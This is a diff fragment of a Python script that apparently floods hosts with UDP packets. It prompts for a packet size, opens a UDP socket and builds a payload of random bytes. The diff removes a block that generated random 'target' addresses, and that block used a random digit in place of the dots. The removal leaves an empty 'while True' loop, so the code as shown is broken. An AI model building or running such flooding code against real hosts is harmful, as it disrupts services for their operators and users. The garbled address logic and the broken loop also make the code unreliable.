@@ -12,13 +12,6 @@ i = 1
 packetes = input("Bytes :")
 #Multiples IPS
 while True:
-   a = str(random.randint(1,5))
-   b = str(random.randint(1,5))
-   c = str(random.randint(1,1))
-   d = str(random.randint(1,1))
-   dot = str(random.randint(1,2))
-   target_host = a + dot + b + dot + c + dot + d
-      
 #packet
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(packetes)
